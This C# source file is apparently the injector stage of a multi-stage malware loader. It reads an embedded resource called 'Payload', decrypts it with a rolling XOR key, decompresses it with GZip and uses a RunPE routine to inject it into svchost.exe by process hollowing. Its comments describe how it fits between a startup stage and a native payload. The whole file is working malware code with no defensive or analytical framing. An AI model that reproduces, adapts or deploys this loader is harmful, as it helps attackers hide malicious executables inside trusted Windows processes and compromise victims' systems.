using Injector.Properties;
using System;
using System.IO;
using System.IO.Compression;

public static class Program
{
	// Loads Payload.exe (native executable) from resources and injects into suitable OS executable.
	// This stage is required to be C#, because the startup stage may only contain C# code with a maximum of 260 characters for the commandline.
	// The next stage is the actual payload, which is required to be a native executable in order to be injected.
	public static void Main()
	{
		string path = Environment.Is64BitOperatingSystem ? @"C:\Windows\SysWOW64\svchost.exe" : @"C:\Windows\System32\svchost.exe";
		byte[] payload = Decompress(Decrypt(Resources.Payload));
		RunPE.Run(path, payload);
	}

	private static byte[] Decompress(byte[] data)
	{
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (GZipStream gzipStream = new GZipStream(new MemoryStream(data), CompressionMode.Decompress))
			{
				gzipStream.CopyTo(memoryStream);
			}

			return memoryStream.ToArray();
		}
	}
	private static byte[] Decrypt(byte[] data)
	{
		byte[] newData = new byte[data.Length];

		byte xor = 0x77;
		for (int i = 0; i < newData.Length; i++)
		{
			newData[i] = (byte)(data[i] ^ xor);
			xor += 5;
		}

		return newData;
	}

}